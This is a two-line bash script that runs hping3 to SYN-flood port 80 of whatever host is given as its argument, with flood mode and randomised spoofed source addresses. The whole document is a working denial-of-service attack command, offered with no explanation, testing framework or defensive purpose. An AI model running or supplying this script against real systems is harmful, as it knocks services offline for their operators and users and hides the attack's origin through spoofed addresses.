#!/bin/bash
hping3 -S $1 -p 80 -i u100 --flood --rand-source